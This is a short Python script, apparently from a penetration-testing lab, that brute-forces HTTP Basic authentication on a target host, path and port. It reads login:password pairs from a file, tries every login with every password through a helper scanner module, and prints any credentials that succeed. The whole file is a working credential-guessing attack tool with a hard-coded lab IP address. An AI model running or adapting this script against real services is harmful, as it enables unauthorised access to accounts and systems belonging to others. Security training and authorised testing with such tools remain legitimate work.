#!/usr/bin/env python3
# 

import http_methods_scanner
import base64
import argparse

def bruter(host, path , port, request_type, cred_file):

    headers={}
    headers["Host"]=b"172.16.120.120"
    headers["Referer"]=b"http://172.16.120.120/"
    logins=[]
    pwds=[]

    #extract logins and passwords separately and put them in a list
    with open(cred_file, "r") as cf:
        for line in cf:
            line.strip('\n')
            delim_pos = line.split(":")
            logins.append(delim_pos[0])
            pwds.append(delim_pos[1])


    for login in logins:
        for pwd in pwds:
            current_credential = (login + ":" + pwd).strip("\n").encode()
            base64_cred = base64.b64encode(current_credential)
            headers ["Authorization"] = b"Basic " + base64_cred   
            res = http_methods_scanner.chk_ressource(host,port, request_type,path, headers)
            if res == "success":
                print("Credentials: ", current_credential)

def main():
    
    parser = argparse.ArgumentParser()
    parser.add_argument('host', type=str)  
    parser.add_argument('port', type=int)
    parser.add_argument('path', type=str)
    parser.add_argument('cred_file', type=str)

    args = parser.parse_args()

    host = args.host
    port = args.port
    path = args.path
    cred_file = args.cred_file
    request_type = 'GET'
    #path = '/admin.php'


    
    bruter(host,path, port, request_type, cred_file)


    return 0


if __name__ == "__main__":
    main()